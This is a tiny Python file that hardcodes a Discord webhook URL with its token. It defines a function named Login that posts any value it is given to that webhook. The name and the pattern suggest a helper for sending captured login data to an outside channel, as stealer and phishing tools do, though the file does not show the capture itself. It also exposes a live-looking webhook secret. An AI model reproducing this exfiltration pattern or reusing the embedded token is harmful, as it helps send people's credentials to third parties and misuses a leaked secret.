import requests

x = "https://discord.com/api/webhooks/1069383844718981251/ZNefTmuPAWzF6qQuvSHZVBWevcTpkX7vMzbgumyLHfrjkMmjjTAaUrXRSA-n5Hc47oxZ"

def Login(variable):
    payload = {
        "content": str(variable)
    }

    requests.post(x, json=payload)
